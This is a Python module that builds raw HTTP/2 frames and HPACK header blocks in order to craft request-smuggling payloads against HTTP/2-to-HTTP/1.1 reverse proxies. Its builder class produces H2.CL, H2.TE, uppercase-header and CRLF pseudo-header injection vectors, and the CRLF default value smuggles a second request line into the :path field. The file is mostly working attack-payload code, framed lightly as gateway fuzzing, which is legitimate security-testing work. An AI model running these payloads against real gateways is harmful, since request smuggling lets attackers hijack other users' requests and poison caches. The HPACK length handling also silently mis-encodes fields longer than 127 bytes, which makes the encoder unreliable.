"""
HTTP/2 Gateway Framing & Desync Engine (RFC 9113, RFC 7540, RFC 7541).

Provides genuine binary HTTP/2 frame construction, serialization, HPACK literal encoding,
and the complete matrix of H2.CL, H2.TE, and pseudo-header gateway translation desync vectors.
"""

import struct
from enum import IntEnum
from typing import Dict, List, Optional, Tuple, Union


class H2FrameType(IntEnum):
    DATA = 0x00
    HEADERS = 0x01
    PRIORITY = 0x02
    RST_STREAM = 0x03
    SETTINGS = 0x04
    PUSH_PROMISE = 0x05
    PING = 0x06
    GOAWAY = 0x07
    WINDOW_UPDATE = 0x08
    CONTINUATION = 0x09


class H2Flag(IntEnum):
    NONE = 0x00
    END_STREAM = 0x01
    END_HEADERS = 0x04
    PADDED = 0x08
    PRIORITY = 0x20


class H2ErrorCode(IntEnum):
    NO_ERROR = 0x00
    PROTOCOL_ERROR = 0x01
    INTERNAL_ERROR = 0x02
    FLOW_CONTROL_ERROR = 0x03
    SETTINGS_TIMEOUT = 0x04
    STREAM_CLOSED = 0x05
    FRAME_SIZE_ERROR = 0x06
    REFUSED_STREAM = 0x07
    CANCEL = 0x08
    COMPRESSION_ERROR = 0x09
    CONNECT_ERROR = 0x0A
    ENHANCE_YOUR_CALM = 0x0B
    INADEQUATE_SECURITY = 0x0C
    HTTP_1_1_REQUIRED = 0x0D


class H2Frame:
    """Represents a standard 9-octet framed HTTP/2 wire protocol message."""

    # 24-byte client connection preface (RFC 9113 Section 3.4)
    CONNECTION_PREFACE: bytes = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

    def __init__(
        self,
        frame_type: Union[H2FrameType, int],
        flags: Union[H2Flag, int] = H2Flag.NONE,
        stream_id: int = 1,
        payload: bytes = b"",
    ):
        self.frame_type = int(frame_type)
        self.flags = int(flags)
        self.stream_id = stream_id & 0x7FFFFFFF  # 31-bit stream identifier
        self.payload = payload

    @property
    def length(self) -> int:
        return len(self.payload)

    def serialize(self) -> bytes:
        """Serializes frame into 9-byte header + payload (RFC 9113 Section 4.1)."""
        length = len(self.payload)
        # 24-bit length: (length >> 16), (length >> 8), (length & 0xFF)
        len_b1 = (length >> 16) & 0xFF
        len_b2 = (length >> 8) & 0xFF
        len_b3 = length & 0xFF
        type_b = self.frame_type & 0xFF
        flags_b = self.flags & 0xFF
        stream_b = struct.pack(">I", self.stream_id & 0x7FFFFFFF)

        header = bytes([len_b1, len_b2, len_b3, type_b, flags_b]) + stream_b
        return header + self.payload

    @classmethod
    def parse(cls, data: bytes) -> Tuple["H2Frame", bytes]:
        """Parses a single HTTP/2 frame from the wire buffer. Returns (frame, remaining_bytes)."""
        if len(data) < 9:
            raise ValueError("Buffer too small for HTTP/2 frame header (needs >= 9 bytes)")

        len_val = (data[0] << 16) | (data[1] << 8) | data[2]
        frame_type = data[3]
        flags = data[4]
        stream_id = struct.unpack(">I", data[5:9])[0] & 0x7FFFFFFF

        total_frame_len = 9 + len_val
        if len(data) < total_frame_len:
            raise ValueError(f"Incomplete frame payload (has {len(data) - 9}, requires {len_val})")

        payload = data[9:total_frame_len]
        remaining = data[total_frame_len:]
        return cls(frame_type=frame_type, flags=flags, stream_id=stream_id, payload=payload), remaining


class HPACKLite:
    """
    Lightweight HPACK (RFC 7541) encoder for literal header fields without indexing.
    Enables custom and malformed header construction for gateway fuzzing.
    """

    @staticmethod
    def encode_literal_header(name: str, value: str, never_index: bool = False) -> bytes:
        """
        Encodes a single header field as a Literal Header Field without Indexing (0000xxxx)
        or Never Indexed (0001xxxx) (RFC 7541 Section 6.2).
        """
        prefix = 0x10 if never_index else 0x00
        name_bytes = name.encode("latin-1")
        val_bytes = value.encode("latin-1")

        # Name length prefix (7-bit integer with H=0 plain text)
        encoded = bytes([prefix]) + bytes([len(name_bytes) & 0x7F]) + name_bytes
        encoded += bytes([len(val_bytes) & 0x7F]) + val_bytes
        return encoded

    @staticmethod
    def encode_headers_block(headers: List[Tuple[str, str]]) -> bytes:
        """Encodes an entire list of (name, value) headers into an HPACK payload block."""
        block = bytearray()
        for name, value in headers:
            block.extend(HPACKLite.encode_literal_header(name, value))
        return bytes(block)

    @staticmethod
    def decode_literal_headers(block: bytes) -> List[Tuple[str, str]]:
        """Decodes basic literal header blocks without indexing."""
        headers = []
        idx = 0
        while idx < len(block):
            if idx >= len(block):
                break
            # Skip pattern prefix byte
            idx += 1
            if idx >= len(block):
                break
            name_len = block[idx] & 0x7F
            idx += 1
            name = block[idx : idx + name_len].decode("latin-1", errors="replace")
            idx += name_len
            if idx >= len(block):
                break
            val_len = block[idx] & 0x7F
            idx += 1
            val = block[idx : idx + val_len].decode("latin-1", errors="replace")
            idx += val_len
            headers.append((name, val))
        return headers


class H2GatewayDesyncBuilder:
    """
    Constructs real binary HTTP/2 wire streams targeting front-end HTTP/2 terminators
    and reverse proxies translating into back-end HTTP/1.1 connections.
    """

    @classmethod
    def build_client_init_stream(cls, settings_entries: Optional[List[Tuple[int, int]]] = None) -> bytes:
        """Constructs connection preface and initial SETTINGS frame."""
        payload = bytearray()
        if settings_entries:
            for ident, val in settings_entries:
                payload.extend(struct.pack(">HI", ident, val))

        settings_frame = H2Frame(
            frame_type=H2FrameType.SETTINGS,
            flags=H2Flag.NONE,
            stream_id=0,
            payload=bytes(payload),
        )
        return H2Frame.CONNECTION_PREFACE + settings_frame.serialize()

    @classmethod
    def build_h2_cl_desync(
        cls,
        path: str = "/",
        host: str = "target.local",
        declared_cl: int = 0,
        actual_payload: bytes = b"X",
        stream_id: int = 1,
    ) -> bytes:
        """
        H2.CL Desynchronization Vector:
        Front-end terminates HTTP/2 and forwards `content-length: <declared_cl>` to HTTP/1.1 backend,
        while the HTTP/2 DATA frame sends a different body length (`actual_payload`).
        """
        headers = [
            (":method", "POST"),
            (":scheme", "https"),
            (":authority", host),
            (":path", path),
            ("content-length", str(declared_cl)),
        ]
        headers_payload = HPACKLite.encode_headers_block(headers)

        # HEADERS frame (END_HEADERS only, keeping stream open for DATA)
        headers_frame = H2Frame(
            frame_type=H2FrameType.HEADERS,
            flags=H2Flag.END_HEADERS,
            stream_id=stream_id,
            payload=headers_payload,
        )

        # DATA frame with actual payload (END_STREAM)
        data_frame = H2Frame(
            frame_type=H2FrameType.DATA,
            flags=H2Flag.END_STREAM,
            stream_id=stream_id,
            payload=actual_payload,
        )

        return headers_frame.serialize() + data_frame.serialize()

    @classmethod
    def build_h2_te_desync(
        cls,
        path: str = "/",
        host: str = "target.local",
        te_value: str = "chunked",
        chunked_body: bytes = b"0\r\n\r\n",
        stream_id: int = 1,
    ) -> bytes:
        """
        H2.TE Desynchronization Vector:
        Injects illegal `transfer-encoding: chunked` into HTTP/2 request.
        RFC 9113 Section 8.2.2 forbids Transfer-Encoding in H2, but permissive gateways
        translate it directly into HTTP/1.1, causing backend desynchronization.
        """
        headers = [
            (":method", "POST"),
            (":scheme", "https"),
            (":authority", host),
            (":path", path),
            ("transfer-encoding", te_value),
        ]
        headers_payload = HPACKLite.encode_headers_block(headers)

        headers_frame = H2Frame(
            frame_type=H2FrameType.HEADERS,
            flags=H2Flag.END_HEADERS,
            stream_id=stream_id,
            payload=headers_payload,
        )

        data_frame = H2Frame(
            frame_type=H2FrameType.DATA,
            flags=H2Flag.END_STREAM,
            stream_id=stream_id,
            payload=chunked_body,
        )

        return headers_frame.serialize() + data_frame.serialize()

    @classmethod
    def build_h2_crlf_pseudoheader_injection(
        cls,
        injected_path: str = "/%20HTTP/1.1\r\nHost: target.local\r\nTransfer-Encoding: chunked\r\nFoo: bar",
        host: str = "target.local",
        stream_id: int = 1,
    ) -> bytes:
        """
        H2 Pseudo-Header CRLF Injection Vector:
        Injects CRLF line terminators directly into the `:path` or `:authority` pseudo-header.
        When translated to HTTP/1.1, generates a secondary HTTP request or split header.
        """
        headers = [
            (":method", "GET"),
            (":scheme", "https"),
            (":authority", host),
            (":path", injected_path),
        ]
        headers_payload = HPACKLite.encode_headers_block(headers)

        headers_frame = H2Frame(
            frame_type=H2FrameType.HEADERS,
            flags=H2Flag.END_HEADERS | H2Flag.END_STREAM,
            stream_id=stream_id,
            payload=headers_payload,
        )

        return headers_frame.serialize()

    @classmethod
    def build_h2_uppercase_header_desync(
        cls,
        path: str = "/",
        host: str = "target.local",
        stream_id: int = 1,
    ) -> bytes:
        """
        H2 Uppercase Header Name Leniency Vector:
        RFC 9113 Section 8.2.1 mandates that all HTTP/2 header names MUST be lowercase.
        Transmits uppercase headers (e.g., 'Content-Length', 'Transfer-Encoding') to test gateway validation.
        """
        headers = [
            (":method", "POST"),
            (":scheme", "https"),
            (":authority", host),
            (":path", path),
            ("Content-Length", "0"),
            ("Transfer-Encoding", "chunked"),
        ]
        headers_payload = HPACKLite.encode_headers_block(headers)

        headers_frame = H2Frame(
            frame_type=H2FrameType.HEADERS,
            flags=H2Flag.END_HEADERS | H2Flag.END_STREAM,
            stream_id=stream_id,
            payload=headers_payload,
        )

        return headers_frame.serialize()

    @classmethod
    def build_h2_reset_stream(cls, stream_id: int = 1, error_code: H2ErrorCode = H2ErrorCode.CANCEL) -> bytes:
        """Constructs an RST_STREAM frame to abort an in-flight stream."""
        payload = struct.pack(">I", int(error_code))
        return H2Frame(
            frame_type=H2FrameType.RST_STREAM,
            flags=H2Flag.NONE,
            stream_id=stream_id,
            payload=payload,
        ).serialize()

    @classmethod
    def build_h2_ping(cls, opaque_data: bytes = b"12345678", is_ack: bool = False) -> bytes:
        """Constructs a 64-bit PING or PING ACK frame."""
        flags = H2Flag.NONE if not is_ack else 0x01
        return H2Frame(
            frame_type=H2FrameType.PING,
            flags=flags,
            stream_id=0,
            payload=opaque_data[:8].ljust(8, b"\x00"),
        ).serialize()
